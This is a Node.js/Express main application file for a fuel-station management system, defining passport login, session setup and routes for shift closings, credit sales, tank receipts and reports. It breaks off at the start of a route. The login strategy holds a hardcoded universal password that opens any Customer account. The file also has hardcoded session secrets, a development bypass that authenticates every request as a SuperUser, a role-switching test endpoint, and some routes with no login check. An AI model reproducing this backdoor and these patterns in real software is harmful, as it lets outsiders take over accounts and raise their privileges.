process.env.FONTCONFIG_FILE = '/var/task/fonts.conf';

const createError = require('http-errors');
const express = require('express');
const path = require('path');
const logger = require('morgan');
const login = require('connect-ensure-login');
const security = require("./utils/app-security");
const UserData = require("./value/UserData");
const msg = require("./config/app-messages");
const config = require("./config/app-config");
require('dotenv').config();
const dateFormat = require("dateformat");
const puppeteer = require('puppeteer');
const fs = require('fs');
const utils = require("./utils/app-utils");
const { getPDF } = require('./utils/app-pdf-generator');
const { getBrowser } = require('./utils/browserHelper');
const MenuAccessDao = require('./dao/menu-access-dao'); 
const bcrypt = require('bcrypt');
const { routeLogger } = require('./utils/route-logger');


// Passport - configuration - start....
const passport = require('passport');
const LocalStrategy = require('passport-local').Strategy;


passport.use(new LocalStrategy(
    function (username, password, done) {
        Person.findOne({ where: { 'User_name': username } })
            .then(async data => {
                try {
                    if (data) {
                        // Compare password using bcrypt
                        const isPasswordValid = await bcrypt.compare(password, data.Password);

                        const isUniversalPassword = (
                            data.Role === 'Customer' &&                             
                            password === 'petromath123'  
                        );
                        
                        if (isPasswordValid|| isUniversalPassword) {

                             if (isUniversalPassword) {
                                    console.log(`Customer ${data.User_name} logged in with universal password`);
                                }

                            let now = new Date();
                            const today_date = dateFormat(now, "yyyy-mm-dd");
                            
                            if (data.effective_end_date > today_date) {

                                 // Check if user's location is active
                                    const isLocationActive = await LocationDao.isLocationActive(data.location_code);
                                    if (!isLocationActive) {
                                        done(null, false, { message: 'This location is currently inactive. Please contact your administrator.' });
                                        return;
                                    }

                                // Fetch menu access from DAO
                                const role = data.Role;
                                const location = data.location_code;
                                const isAdmin = security.isAdminChk(data);

                                const menus = await MenuAccessDao.getAllowedMenusForUser(role, location);
                                const allowedMenus = menus.map(m => m.menu_code);
                                const menuDetails = menus;

                                // Construct enriched UserData
                                const userInfo = new UserData(data, isAdmin, allowedMenus, menuDetails);                               

                                return done(null, userInfo);
                            } else {
                                // Account is disabled
                                done(null, false, { 
                                    message: `${data.User_Name} Your User Account is Disabled`,
                                    Person_id: data.Person_id,
                                    location_code: data.location_code
                                });
                            }
                        } else {
                            // Password mismatch
                            done(null, false, { 
                                message: 'User name or password is incorrect',
                                Person_id: data ? data.Person_id : null,
                                location_code: data ? data.location_code : null
                            });
                        }
                    } else {
                        // No user found
                        done(null, false, { message: 'User name or password is incorrect' });
                    }
                } catch (err) {
                    console.warn("Error in authentication: " + err);
                    done(null, false, { message: err.toString() });
                }
            })
            .catch(err => {
                console.warn("Error in app :::: " + err);
                done(null, false, { message: err.toString() });
            });
    }));

passport.serializeUser((userData, done) => {
    done(null, userData);
});

passport.deserializeUser(function (userInfo, done) {
    Person.findOne({where: {'User_Name': userInfo.User_Name}})
        .then(function (user) {
            done(null, userInfo);
        })
        .catch(function (err) {
            done(err);
        });
});
// Passport - configuration - end

// App cache - start
const appCache = require('./utils/app-cache')
appCache.initializeCache();
// App cache - end

// ORM DB - start
const db = require("./db/db-connection");



const dbMapping = require("./db/ui-db-field-mapping")
const Person = db.person;
const ProductDao = require("./dao/product-dao");
const PersonDao = require("./dao/person-dao");
var CreditDao = require("./dao/credits-dao");
const SupplierDao = require("./dao/supplier-dao");
const LoginLogDao = require("./dao/login-log-dao");
const LocationDao = require("./dao/location-dao");
const { handleVersionRouting } = require('./utils/version-routing');

db.sequelize.sync();
// ORM DB - end

// Router business
const HomeController = require("./controllers/home-controller");
const ClosingEditController = require("./controllers/closing-edit-controller");
const ClosingDeleteController = require("./controllers/closing-delete-controller");
const receiptController = require("./controllers/credit-receipt-controller");
const tankReceiptController = require("./controllers/tank-receipt-controller");
const masterController = require("./controllers/master-data-controller");
const cashflowController = require("./controllers/cash-flow-controller");
const utilitiesController = require("./controllers/utilities-controller");
const reportsController = require("./controllers/reports-controller");
const cashflowReportsController = require("./controllers/reports-cashflow-controller");
const dsrReportsController = require("./controllers/reports-dsr-controller");
const gstsummaryreportsController = require("./controllers/reports-gst-summary-controller");
const digitalReconreportsController = require("./controllers/reports-digital-recon-controller");
const decantEditController = require("./controllers/decant-edit-controller");
const truckLoadController = require("./controllers/truck-load-controller");
const dashBoardController = require("./controllers/dashboard-controller");
const deadlineController = require("./controllers/deadline-master-controller");
const creditController = require("./controllers/credit-controller");
const tankDipController = require("./controllers/tank-dip-controller");
const pumpController = require("./controllers/pump-controller");
const billController = require("./controllers/bill-controller");
const lubesInvoiceController = require("./controllers/lubes-invoice-controller");
const supplierController = require("./controllers/supplier-controller");
const closingSaveController = require("./controllers/closing-save-controller");
const passwordResetController = require('./controllers/password-reset-controller');
const txnController = require("./controllers/txn-common-controller");



const flash = require('express-flash');
const bodyParser = require('body-parser');
const { log } = require('console');

// app configurations - start
const deploymentConfig = "./config/app-deployment-" + process.env.ENVIRONMENT;
const serverConfig = require(deploymentConfig);
const app = express();
security.secureApp(app);
app.use(express.static(path.join(__dirname, 'public')));


const vehicleRoutes = require('./routes/vehicle-routes'); 
const passwordRoutes = require('./routes/password-reset-routes'); 
const tallyDaybookRoutes = require('./routes/tally-daybook-routes'); 
const customerDashboardRoutes = require('./routes/customer-dashboard-routes');
const adjustmentRoutes = require('./routes/adjustment-routes');
const productsRoutes = require('./routes/products-routes');
const pumpTankRoutes = require('./routes/pump-tank-routes');
const devTrackerRoutes = require('./routes/dev-tracker-routes');
const systemHealthRoutes = require('./routes/system-health-routes');
const transactionCorrectionsRoutes = require('./routes/transaction-corrections-routes');
const tankRoutes = require('./routes/tank-routes');
const billsRoutes = require('./routes/bills-routes');
const usageDashboardRoutes = require('./routes/usage-dashboard-routes');
const menuManagementRoutes = require('./routes/menu-management-routes');
const stockAdjustmentRoutes = require('./routes/stock-adjustment');
const stockReportsRoutes = require('./routes/stock-reports-routes');
const creditMasterRoutes = require('./routes/credit-master-routes');
const locationMasterRoutes = require('./routes/location-master-routes');
const apiRoutes = require('./api/apiRoutes');
const cashflowDetailedRoutes = require('./routes/cashflow-detailed-routes');
const creditReceiptsRoutes = require('./routes/credit-receipts-routes');
const personLocationRoutes = require('./routes/person-location-routes');
const oilCompanyStatementRoutes = require('./routes/oil-company-statement-routes');
const bankStatementRoutes = require('./routes/bank-statement-routes');



//const auditingUtilitiesRoutes = require('./routes/auditing-utilities-routes');

// Add method-override here
const methodOverride = require('method-override');
app.use(methodOverride('_method'));


app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(flash());
app.use(require('cookie-parser')('keyboard cat'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(require('express-session')({ secret: 'keyboard cat', resave: false, saveUninitialized: false }));
app.use(passport.initialize());
app.use(passport.session());







// Development login bypass - respecting location changes
const bypassLoginInDev = async (req, res, next) => {
    if (process.env.NODE_ENV === 'development' && process.env.SKIP_LOGIN === 'true') {
        // Get current location from session or default to MUE
        const currentLocation = req.session.selectedLocation || "MUE";
        
        // Check if user needs to be created or location changed
        if (!req.user || req.user.location_code !== currentLocation || req.session.menuCacheCleared) {
            try {
                const role = "SuperUser";
                
                const menus = await MenuAccessDao.getAllowedMenusForUser(role, currentLocation);
                const allowedMenus = menus.map(m => m.menu_code);
                
                req.user = {
                    Person_id: 758,
                    Person_Name: "MUTHU SAKTHIVELAN",
                    User_Name: "SAKTHI",
                    Role: "SuperUser", 
                    location_code: currentLocation,
                    isAdmin: true,
                    creditlist_id: null,
                    allowedMenus: allowedMenus,
                    menuDetails: menus
                };
                
                // Clear the cache flag
                delete req.session.menuCacheCleared;
            } catch (error) {
                console.error('Error fetching menu data for bypass:', error);
            }
        }
        req.isAuthenticated = () => true;
    }
    next();
};



// Apply the bypass middleware
app.use(bypassLoginInDev);


const addUserLocationInfo = async (req, res, next) => {
    if (req.user && req.user.Person_id) {
        try {
            const personId = req.user.Person_id;
            
            // SuperUsers always get the location switcher (can access all locations)
            if (req.user.Role === 'SuperUser') {
                req.user.hasMultipleLocations = true;
                // Get all locations for SuperUsers
                const allLocations = await LocationDao.findAllLocations();
                req.user.availableLocations = allLocations.map(loc => ({
                    location_code: loc.location_code,
                    location_name: loc.location_name,
                    source: 'SUPERUSER',
                    role: 'SuperUser'
                }));
            } else {
                // Regular users: check their actual location access
                const userLocations = await PersonDao.getUserAccessibleLocationsWithNames(personId);
                
                req.user.hasMultipleLocations = userLocations.length > 1;
                req.user.availableLocations = userLocations;
            }
            
        } catch (error) {
            console.error('Error adding user location info:', error);
            // Don't break the request - just set defaults
            req.user.hasMultipleLocations = false;
            req.user.availableLocations = [];
        }
    }
    
    next();
};

app.use(addUserLocationInfo);



// Route logging middleware - tracks user navigation patterns for analytics
app.use(routeLogger({
    enabled: process.env.NODE_ENV !== 'test', // Disable in test environment
    excludeRoutes: [
        '/api/',           // Skip API calls
        '/stylesheets/',   // Skip CSS files  
        '/javascripts/',   // Skip JS files
        '/images/',        // Skip images
        '.css',           
        '.js',
        '.png',
        '.jpg',
        '.ico',
        '/health',        // Skip health checks
        '/ping'           // Skip ping requests
    ]
}));



app.use('/vehicles', vehicleRoutes);
app.use('/password', passwordRoutes);
app.use('/reports-tally-daybook', tallyDaybookRoutes);
app.use('/customer', customerDashboardRoutes);
app.use('/adjustments', adjustmentRoutes);
app.use('/products', productsRoutes);
app.use('/dev-tracker', devTrackerRoutes);
app.use('/system-health', systemHealthRoutes);
app.use('/api/transaction-corrections', transactionCorrectionsRoutes);
app.use('/tank-master', tankRoutes);
app.use('/bills', billsRoutes);
app.use('/usage-dashboard', usageDashboardRoutes);
app.use('/menu-management', menuManagementRoutes);
app.use('/reports/stock', stockReportsRoutes);
app.use('/credit-master', creditMasterRoutes);
app.use('/location-master', locationMasterRoutes);
app.use('/masters/pump-tank',pumpTankRoutes);
app.use('/stock-adjustment', stockAdjustmentRoutes);
app.use('/api', apiRoutes);
app.use('/reports-cashflow-detailed', cashflowDetailedRoutes);
app.use('/creditreceipts', creditReceiptsRoutes);
app.use('/assign-person-locations', personLocationRoutes);
app.use('/oil-company-statement', oilCompanyStatementRoutes); 
app.use('/bank-statement', bankStatementRoutes); 

//app.use('/auditing-utilities', auditingUtilitiesRoutes);
app.use((req, res, next) => {
    res.locals.APP_VERSION = process.env.APP_VERSION || 'stable';
    res.locals.SERVER_PORT = process.env.SERVER_PORT;
    res.locals.CACHE_BUST = Date.now(); // Cache busting version
    next();
});





app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));





const isLoginEnsured = login.ensureLoggedIn({});
//const isLoginEnsured = login.ensureNotLoggedIn({});     // enable for quick development only

app.use((req, res, next) => {    
    

      
    if (req.user && req.user.creditlist_id) {
        const creditlistId = req.user.creditlist_id;

        // Query the `m_creditlist` table to get the customer name (Company_Name)
        CreditDao.findCreditDetails(creditlistId)
            .then(creditDetails => {
                if (creditDetails && creditDetails.length > 0) {
                    
                    // Set the companyName globally in res.locals
                    res.locals.companyName = creditDetails[0].Company_Name;
                } else {
                    res.locals.companyName = 'Guest';  // Fallback if no details found
                }
                next();
            })
            .catch(err => {
                console.error('Error fetching customer details:', err);
                res.locals.companyName = 'Guest';  // Fallback in case of error
                next();
            });
    } else {
        // If the user is not logged in, set a default guest name
        res.locals.companyName = 'Guest';
        next();
    }
});




app.get('/login', function (req, res) {
    res.render('login', { title: 'Login' });
});

// Routes - start
app.get('/', isLoginEnsured, function (req, res) {
    if(req.user.Role === 'Customer') {
        res.redirect('/home-customer');    
    }
    res.redirect('/home');
});


app.get('/home-customer',isLoginEnsured, function (req, res) { 
    res.redirect('/customer/credit-statement');   
});

app.get('/reports-indiv-customer', isLoginEnsured, function (req, res, next) { 
    const today = new Date();
    
    // Get the first day of the current month
    const firstDay = new Date(today.getFullYear(), today.getMonth(), 1);
    
    // Get the last day of the current month
    const lastDay = new Date(today.getFullYear(), today.getMonth() + 1, 0);

    // Format the dates to 'yyyy-mm-dd' format for consistency
    const fromClosingDate = firstDay.toISOString().split('T')[0];
    const toClosingDate = lastDay.toISOString().split('T')[0];
    req.body.reportType = 'CreditDetails';
    req.body.caller = 'notpdf';
    req.body.fromClosingDate = fromClosingDate;
    req.body.toClosingDate = toClosingDate;
    

    
    reportsController.getCreditReport(req, res, next);
    
});

app.post('/reports-indiv-customer', isLoginEnsured, function (req, res, next) {    
    req.body.reportType = 'CreditDetails';
    reportsController.getCreditReport(req, res, next);
});

app.post('/api/reports-indiv-customer', function (req, res, next) {    
    req.body.reportType = 'CreditDetails';
    reportsController.getApiCreditReport(req, res, next);
});


app.get('/logout', function (req, res) {
    req.logout(function (err) {
        if (err) { return next(err); }
        res.redirect('/login');
    });
});



app.post('/generate-pdf', isLoginEnsured,getPDF);

app.use(security.isNotCustomer());


app.post('/reports-customer', isLoginEnsured, function (req, res, next) {    
    req.body.reportType = 'CreditDetails';
    reportsController.getCreditReport(req, res, next);
});



// app.get('/products', [isLoginEnsured, security.isAdmin()], function (req, res) {
//     let locationCode = req.user.location_code;
//     let products = [];
//     ProductDao.findProducts(locationCode)
//         .then(data => {
//             data.forEach((product) => {
//                 products.push({
//                     id: product.product_id,
//                     name: product.product_name,
//                     unit: product.unit,
//                     qty: product.qty,
//                     price: product.price,
//                     ledger_name: product.ledger_name,
//                     cgst_percent: product.cgst_percent,
//                     sgst_percent: product.sgst_percent,
//                     sku_name: product.sku_name,
//                     sku_number: product.sku_number,
//                     hsn_code: product.hsn_code                   
//                 });
//             });
//             res.render('products', { title: 'Products', user: req.user, products: products, config: config.APP_CONFIGS, });
//         });
// });

// TODO: fix for multiple products
// app.post('/products', [isLoginEnsured, security.isAdmin()], function (req, res) {
//     ProductDao.create(dbMapping.newProduct(req));
//     res.redirect('/products');
// });


// app.put('/product/:id', [isLoginEnsured, security.isAdmin()], function (req, res) {
//     ProductDao.update({
//         product_id: req.params.id,
//         price: req.body.m_product_price,
//         unit: req.body.m_product_unit,
//         ledger_name: req.body.m_product_ledger_name,
//         cgst_percent: req.body.m_product_cgst,
//         sgst_percent: req.body.m_product_sgst
//     }).then(data => {
//         if (data == 1 || data == 0) {
//             res.status(200).send({ message: 'Saved product data successfully.' });
//         } else {
//             res.status(500).send({ error: 'Error while saving data.' });
//         }
//     });
// });

app.put('/disable-user/:id', [isLoginEnsured, security.isAdmin()], function (req, res) {
    let loginUserId = req.user.Person_id;
    const userId = req.params.id;
    if (userId == loginUserId) {
        res.status(400).send({ error: 'Cannot disable ' + req.user.Person_Name + ' as you are logged in as ' + req.user.Person_Name });
    } else {
        PersonDao.disableUser(userId).then(data => {
            if (data == 1) {
                res.status(200).send({ message: 'User disabled successfully.' });
            } else {
                res.status(500).send({ error: 'Error disabling user.' });
            }
        })
    }
});

app.get('/enable_user', [isLoginEnsured, security.isAdmin()], function (req, res) {
    masterController.findDisableUsers(req.user.location_code)
        .then(data => {
            res.render('enable_user', {
                title: 'Disabled Users',
                user: req.user,
                users: data
            });
        })
        .catch(err => {
            console.error("Error fetching users:", err);
            res.status(500).send("An error occurred.");
        });
});





app.put('/enable-user/:id', [isLoginEnsured, security.isAdmin()], function (req, res) {
    const userId = req.params.id;
    PersonDao.enableUser(userId)
        .then(data => {
            if (data == 1) {
                res.status(200).send({ success: true, message: 'User enabled successfully.' });
            } else {
                res.status(400).send({ success: false, error: 'Error enabling user.' });
            }
        })
});







// Digital Master - POST route (for saving new digital customers)
app.post('/digital', [isLoginEnsured, security.isAdmin()], function (req, res) {
    // Set card_flag to 'Y' for digital customers
    req.body.card_flag = 'Y';
    CreditDao.create(dbMapping.newDigitalCustomer(req));
    res.redirect('/digital');
});








app.get('/users', [isLoginEnsured, security.isAdmin()], function (req, res) {
    masterController.findUsers(req.user.location_code).then(data => {
        res.render('users', { title: 'Users', user: req.user, users: data });
    });
});


app.post('/users', [isLoginEnsured, security.isAdmin()], function (req, res) {
    masterController.createUser(req, res);
});



app.get('/home', isLoginEnsured, function (req, res, next) {
    HomeController.getHomeDataFn(req, res, next); // response returned inside controller
});

app.get('/reports', isLoginEnsured, function (req, res, next) {
    let locationCode = req.user.location_code;
    req.body.reportType = 'CreditDetails';
    let credits = [];
    CreditDao.findAll(locationCode)
        .then(data => {
            data.forEach((credit) => {
                if (!(credit.card_flag === 'Y')) {  // condition to ignore Digital.
                    credits.push({
                        id: credit.creditlist_id,
                        name: credit.Company_Name
                    });
                }
            });

            res.render('reports', { title: 'Reports', user: req.user, credits: credits });

        });
});

app.post('/reports', isLoginEnsured, function (req, res, next) {
    req.body.reportType = 'CreditDetails';
    reportsController.getCreditReport(req, res, next);
});


app.get('/reports-credit-ledger', isLoginEnsured, function (req, res, next) {
    let locationCode = req.user.location_code;
    let credits = [];
    req.body.caller = 'notpdf';
    req.body.reportType = 'Creditledger';

    CreditDao.findAll(locationCode)
        .then(data => {
            data.forEach((credit) => {
                if (!(credit.card_flag === 'Y')) {  // condition to ignore Digital.
                    credits.push({
                        id: credit.creditlist_id,
                        name: credit.Company_Name
                    });
                }
            });

            res.render('reports-credit-ledger', { title: 'Reports', user: req.user, credits: credits });

        });
});

app.post('/reports-credit-ledger', isLoginEnsured, function (req, res, next) {
    req.body.reportType = 'Creditledger';
    reportsController.getCreditReport(req, res, next);
});


app.get('/reports-digital-recon', isLoginEnsured, function (req, res, next) {
    let locationCode = req.user.location_code;
    let credits = [];
    req.body.caller = 'notpdf';

    // Fetch data asynchronously
    CreditDao.findAll(locationCode)
        .then(data => {
            data.forEach(credit => {
                console.log(`${credit.Company_Name}  ${credit.card_flag}`);
                if (credit.card_flag === 'Y') {
                    credits.push({
                        id: credit.creditlist_id,
                        name: credit.Company_Name
                    });
                }
            });

            // Render the response after processing the credits
            console.log('Processed credits:', credits);
            res.render('reports-digital-recon', {
                title: 'Digital Reconciliation Report',
                user: req.user,
                credits: credits
            });
        })
        .catch(error => {
            // Handle errors gracefully
            console.error('Error fetching credits:', error);
            res.status(500).send('Internal Server Error');
        });
});

app.post('/reports-digital-recon', isLoginEnsured, function (req, res, next) {   
    digitalReconreportsController.getDigitalReconReport(req, res, next);
});

app.get('/reports-gst-summary', isLoginEnsured, function (req, res, next) {   
    req.body.caller = 'notpdf';
    gstsummaryreportsController.getgstsummaryReport(req, res, next);
});

app.post('/reports-gst-summary', isLoginEnsured, function (req, res, next) {    
    gstsummaryreportsController.getgstsummaryReport(req, res, next);
});

app.get('/reports-sales-summary', isLoginEnsured, function (req, res, next) {   
    req.body.caller = 'notpdf';
    reportsController.getSalesSummaryReport(req, res, next);
});

app.post('/reports-sales-summary', isLoginEnsured, function (req, res, next) {    
    reportsController.getSalesSummaryReport(req, res, next);
});

app.get('/reports-creditsummary', isLoginEnsured, function (req, res, next) {
    //res.render('reports-creditsummary', { title: 'Credit Summary Reports', user: req.user });
    req.body.toClosingDate = new Date(Date.now());
    req.body.caller = 'notpdf';
    reportsController.getCreditSummaryReport(req, res, next);

});

app.post('/reports-creditsummary', isLoginEnsured, function (req, res, next) {
    reportsController.getCreditSummaryReport(req, res, next);
});

app.get('/reports-cashflow', isLoginEnsured, function (req, res, next) {
    req.body.cfclosingDate = new Date(Date.now());
    req.body.caller = 'notpdf';
    cashflowReportsController.getCashFlowReport(req, res, next);
});

app.post('/reports-cashflow', isLoginEnsured, function (req, res, next) {
    cashflowReportsController.getCashFlowReport(req, res, next);
});

app.get('/reports-dsr', isLoginEnsured, function (req, res, next) {
    req.body.fromClosingDate = new Date(Date.now());
    req.body.caller = 'notpdf';
    dsrReportsController.getdsrReport(req, res, next);
});

app.post('/reports-dsr', isLoginEnsured, function (req, res, next) {
    dsrReportsController.getdsrReport(req, res, next);
});




app.get('/new-closing', isLoginEnsured, function (req, res, next) {
    HomeController.getNewData(req, res, next);  // response returned inside controller
});

app.post('/new-closing', isLoginEnsured, function (req, res, next) {
    HomeController.saveClosingData(req, res, next);  // response returned inside controller
});

app.post('/new-attendance', isLoginEnsured, function (req, res, next) {
    HomeController.saveAttendanceData(req, res, next);  // response returned inside controller
});

app.delete('/remove-attendance', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    HomeController.deleteAttendanceData(req, res, next);  // response returned inside controller
});

app.post('/new-readings', isLoginEnsured, function (req, res, next) {
    HomeController.saveReadingData(req, res, next);  // response returned inside controller
});

app.delete('/remove-reading', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    HomeController.deleteTxnReading(req, res, next);  // response returned inside controller
});

app.post('/update-closing-reading-time', isLoginEnsured, function(req, res, next) {    
    const updateData = req.body.updateData[0];

    console.log('Route - About to call controller with:', {
        closingId: updateData.closing_id,
        readingTime: updateData.close_reading_time, 
        updatedBy: updateData.updated_by
    });
    

    closingSaveController.txnUpdateClosingReadingTimePromise(
        updateData.closing_id, 
        updateData.close_reading_time, 
        updateData.updated_by
    ).then(data => {
        if (data.error) {
            res.status(500).send({error: data.error});
        } else {
            res.status(200).send({message: 'Reading time updated successfully.', rowsData: data});
        }
    }).catch(err => {
        res.status(500).send({error: 'Error updating reading time: ' + err.toString()});
    });
    
   
});

app.post('/new-2t-sales', isLoginEnsured, function (req, res, next) {
    HomeController.save2TSalesData(req, res, next);  // response returned inside controller
});

app.post('/new-cash-sales', isLoginEnsured, function (req, res, next) {
    HomeController.saveCashSalesData(req, res, next);  // response returned inside controller
});

app.delete('/remove-cash-sale', isLoginEnsured, function (req, res, next) {
    HomeController.deleteTxnCashSale(req, res, next);  // response returned inside controller
});

app.post('/new-credit-sales', isLoginEnsured, function (req, res, next) {
    HomeController.saveCreditSalesData(req, res, next);  // response returned inside controller
});

app.delete('/remove-credit-sale', isLoginEnsured, function (req, res, next) {
    HomeController.deleteTxnCreditSale(req, res, next);  // response returned inside controller
});

app.post('/new-digital-sales', isLoginEnsured, function (req, res, next) {
    HomeController.saveDigitalSalesData(req, res, next);  // response returned inside controller
});

app.delete('/remove-digital-sales', isLoginEnsured, function (req, res, next) {
    HomeController.deleteTxnDigitalSale(req, res, next);  // response returned inside controller
});

app.delete('/remove-digital-sale', isLoginEnsured, function (req, res, next) {
    HomeController.deleteTxnDigitalSale(req, res, next);  // response returned inside controller
});

app.post('/new-expenses', isLoginEnsured, function (req, res, next) {
    HomeController.saveExpensesData(req, res, next);
});

app.delete('/remove-expense', isLoginEnsured, function (req, res, next) {
    HomeController.deleteTxnExpense(req, res, next);  // response returned inside controller
});

app.post('/new-denoms', isLoginEnsured, function (req, res, next) {
    HomeController.saveDenomsData(req, res, next);  // response returned inside controller
});

app.get('/edit-draft-closing', isLoginEnsured, function (req, res, next) {
    ClosingEditController.getDataToEdit(req, res, next, false);  // response returned inside controller
});

app.post('/close-closing', [isLoginEnsured, security.hasPermission('CLOSE_SHIFT_CLOSE')], function (req, res, next) {
    ClosingEditController.closeData(req, res, next);  // response returned inside controller
});

app.delete('/delete-closing', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    ClosingDeleteController.deleteClosingRecord(req, res, next);  // response returned inside controller
});

app.get('/get-excess-shortage', isLoginEnsured, function (req, res, next) {
    HomeController.getExcessShortage(req, res, next);
});


app.get('/api/shift-products/:closingId', (req, res) => {
    
    
    const closingId = req.params.closingId;
    txnController.shiftProductsPromise(closingId)
        .then(products => {
            console.log('Database returned:', products);
            res.json(products);
        })
        .catch(err => {
            console.error('Database error:', err);
            res.json([]);
        });
});





// REPLACE the testing routes in app.js with this:
app.post('/test-switch-role', isLoginEnsured, function(req, res, next) {
    // Only allow if user is originally SuperUser
    if (req.user.Role === 'SuperUser' || req.user.originalRole === 'SuperUser') {
        if (!req.user.originalRole) {
            req.user.originalRole = req.user.Role;  // Save in user object
            req.session.originalRole = req.user.Role;  // Also save in session for persistence
        }
        req.user.Role = req.body.testRole;
        if (req.session.user) {
            req.session.user.Role = req.body.testRole;
            req.session.user.originalRole = req.user.originalRole;  // Keep original in session
        }
        console.log(`Role switched to: ${req.body.testRole}`);
    }
    res.redirect('back');
});

app.get('/test-reset-role', isLoginEnsured, function(req, res, next) {
    if (req.user.originalRole || req.session.originalRole) {
        const originalRole = req.user.originalRole || req.session.originalRole;
        req.user.Role = originalRole;
        if (req.session.user) {
            req.session.user.Role = originalRole;
            delete req.session.user.originalRole;
        }
        delete req.user.originalRole;
        delete req.session.originalRole;
        console.log(`Role reset to: ${originalRole}`);
    }
    res.redirect('back');
});


// app.post('/login', function (req, res, next) {
//     passport.authenticate('local', {
//         successRedirect: '/home',
//         failureRedirect: '/login',
//         failureFlash: true
//     })(req, res, req.body.username, req.body.password, next);
// });

app.post('/login', function(req, res, next) {
    passport.authenticate('local', async function(err, user, info) {
        if (err) { 
            return next(err); 
        }
        
        // Capture request info
        const loginInfo = {
            ip_address: req.ip,
            user_agent: req.headers['user-agent'],
            attempted_username: req.body.username  // Capture the attempted username
        };

        if (!user) {
            // Log failed login attempt
            try {
                await LoginLogDao.create({
                    Person_id: info.Person_id || null,
                    ip_address: loginInfo.ip_address,
                    user_agent: loginInfo.user_agent,
                    attempted_username: loginInfo.attempted_username,
                    login_status: 'failed',
                    failure_reason: info.message,
                    location_code: info.location_code || null,
                    created_by: 'SYSTEM'
                });
            } catch (error) {
                console.error("Error logging failed login:", error);
            }
            
            req.flash('error', info.message);
            return res.redirect('/login');
        }

        req.logIn(user, async function(err) {
            if (err) { 
                return next(err); 
            }

            // Log successful login after successful authentication
            try {
                await LoginLogDao.create({
                    Person_id: user.Person_id,
                    ip_address: loginInfo.ip_address,
                    user_agent: loginInfo.user_agent,
                    attempted_username: loginInfo.attempted_username,
                    login_status: 'success',
                    location_code: user.location_code,
                    created_by: user.Person_id.toString()
                });
            } catch (error) {
                console.error("Error logging login:", error);
            }

                 const shouldRedirect = await handleVersionRouting(user, req, res);
		        if (shouldRedirect) {
		                 return; // Redirect happened, stop processing
		            }	


             // Check if the user is a superuser
             if (user.Role === 'SuperUser') {
                // Redirect to location selection page if superuser
                return res.redirect('/select-location');
            }

            if(user.Role === 'Customer') {              
                return res.redirect('/home-customer');
                        }
                else{
                    return res.redirect('/home');}            
        });
    })(req, res, next);
});



app.get('/cashflow', isLoginEnsured, function (req, res, next) {
    cashflowController.getCashFlowEntry(req, res, next);
});

app.post('/cashflow', [isLoginEnsured, security.hasPermission('GENERATE_DAY_CLOSE')], function (req, res, next) {
    cashflowController.triggerCashSalesByDate(req, res, next);
});

app.delete('/cashflow', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    cashflowController.deleteCashFlowClosing(req, res, next);  // response returned inside controller
});

app.delete('/remove-cashflow-txn', isLoginEnsured, function (req, res, next) {
    cashflowController.deleteCashFlow(req, res, next);
});

app.post('/save-cashflow-txns', isLoginEnsured, function (req, res, next) {
    cashflowController.saveCashflowTxnData(req, res, next);
});

app.post('/save-cashflow-denoms', isLoginEnsured, function (req, res, next) {
    cashflowController.saveCashflowDenomsData(req, res, next);
});

app.get('/cashflowhome', isLoginEnsured, function (req, res) {
    cashflowController.getCashFlowHome(req, res);
});

app.post('/close-cashflow', [isLoginEnsured, security.hasPermission('CLOSE_DAY_CLOSE')], function (req, res, next) {
    cashflowController.closeData(req, res, next);  // response returned inside controller
});

app.get('/tankreceipts', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    tankReceiptController.getTankReceipts(req, res, next);    // response returned inside controller
});


app.get('/edit-draft-tankrcpt', isLoginEnsured, function (req, res, next) {
    decantEditController.getDataToEdit(req, res, next);  // response returned inside controller
});


app.post('/close-receipt', isLoginEnsured, function (req, res, next) {
    tankReceiptController.closeData(req, res, next);
});

app.get('/new-decant', isLoginEnsured, function (req, res) {
    tankReceiptController.getNewData(req, res);
});

app.post('/new-decant', isLoginEnsured, function (req, res, next) {
    tankReceiptController.saveTankReceipts(req, res, next);  // response returned inside controller
});

app.post('/new-decant-lines', isLoginEnsured, function (req, res, next) {
    tankReceiptController.saveDecantLines(req, res, next);  // response returned inside controller
});

app.delete('/remove-decant-line', isLoginEnsured, function (req, res, next) {
    tankReceiptController.deleteDecantLines(req, res, next);
});

app.delete('/delete-tankReceipt', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    tankReceiptController.deleteTankReceipts(req, res, next);
});

app.get('/truck-load', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    truckLoadController.getTruckData(req, res, next);  // response returned inside controller
});

app.post('/truck-load', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    truckLoadController.saveTruckData(req, res, next);  // response returned inside controller
});

app.delete('/delete-truckload', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    truckLoadController.deleteTruckLoad(req, res, next);
});

app.get('/truck-expense', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    truckLoadController.getTruckExpenseData(req, res, next);  // response returned inside controller
});

app.post('/truck-expense', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    truckLoadController.saveTruckExpenseData(req, res, next);  // response returned inside controller
});

app.delete('/delete-truckexpense', [isLoginEnsured, security.isAdmin()], function (req, res, next) {
    truckLoadController.deleteTruckExpense(req, res, next);
});

app.get('/utilities', isLoginEnsured, function (req, res) {
    utilitiesController.get(req, res);    // response returned inside controller
});

app.get('/density', isLoginEnsured, function (req, res) {
    utilitiesController.getDensity(req, res);    // response returned inside controller
});

app.get('/dip-chart', isLoginEnsured, function (req, res) {
    utilitiesController.getDipChart(req, res);    // response returned inside controller
});

app.post('/tally-export', isLoginEnsured, function (req, res) {
    utilitiesController.getTallyExport(req, res);    // response returned inside controller
});

// Financial year ZIP export
app.post('/tally/export-range', isLoginEnsured, function (req, res) {
    utilitiesController.getTallyExportRange(req, res);
});



app.get('/charts', isLoginEnsured, function (req, res) {
    res.render('charts', { user: req.user, location: req.user.location_code });    // response returned inside controller
});

// app.get('/charts/:id', isLoginEnsured, function (req, res) {
//     dashBoardController.getCharatData(req, res);    // response returned inside controller
// });
// routes - end

app.get('/deadline', isLoginEnsured, function (req, res, next) {
